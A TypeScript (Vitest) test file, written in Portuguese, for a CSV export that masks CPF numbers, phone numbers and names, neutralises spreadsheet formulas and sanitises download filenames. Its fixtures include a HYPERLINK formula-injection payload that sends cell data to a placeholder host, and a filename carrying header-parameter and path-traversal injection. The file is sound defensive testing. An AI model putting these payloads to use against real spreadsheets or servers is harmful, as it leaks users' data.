import { describe, expect, it } from "vitest";
import { gerarCsv, neutralizarFormula, type ColunaExportacao } from "@/lib/exportacao/csv";
import { cabecalhosDownload } from "@/lib/exportacao/exportar";

interface Linha { nome: string; cpf: string; telefone: string; obs: string; vagas: number }
const colunas: ColunaExportacao<Linha>[] = [
  { titulo: "Nome", tipo: "nome", valor: (l) => l.nome },
  { titulo: "CPF", tipo: "cpf", valor: (l) => l.cpf },
  { titulo: "Telefone", tipo: "telefone", valor: (l) => l.telefone },
  { titulo: "Observação", tipo: "texto", valor: (l) => l.obs },
  { titulo: "Vagas", tipo: "numero", valor: (l) => l.vagas },
];

describe("CSV de exportação", () => {
  const csv = gerarCsv(
    colunas,
    [{ nome: "Maria Aparecida da Silva", cpf: "52998224725", telefone: "84998765432", obs: '=HYPERLINK("http://x/?"&A1)', vagas: 2 },
     { nome: "José Fictício", cpf: "111", telefone: "", obs: "ligar 529.982.247-25", vagas: 1 }],
    "Exportação abc · uso restrito",
  );

  it("mascara documento, telefone e nome pelo tipo da coluna", () => {
    expect(csv).not.toContain("52998224725");
    expect(csv).not.toContain("84998765432");
    expect(csv).not.toContain("Aparecida");
    expect(csv).toContain('"***.982.247-**"');
    expect(csv).toContain('"(84) *****-5432"');
  });

  it("redige dado pessoal em texto livre", () => {
    expect(csv).not.toContain("529.982.247-25");
  });

  it("neutraliza fórmulas", () => {
    expect(csv).toContain(`"'=HYPERLINK(""http://x/?""&A1)"`);
    for (const c of ["=1+1", "+1", "-1", "@SUM(A1)", "\tx"]) expect(neutralizarFormula(c).startsWith("'")).toBe(true);
    expect(neutralizarFormula("UBS Centro")).toBe("UBS Centro");
  });

  it("leva rodapé de rastreio e BOM", () => {
    expect(csv.startsWith("﻿")).toBe(true);
    expect(csv.trimEnd().endsWith('"Exportação abc · uso restrito"')).toBe(true);
  });

  it("download sem cache e com nome saneado", () => {
    const h = cabecalhosDownload('rel"; x=../../a.csv');
    expect(h["Content-Disposition"]).toBe('attachment; filename="rel___x_.._.._a.csv"');
    expect(h["Cache-Control"]).toContain("no-store");
  });
});
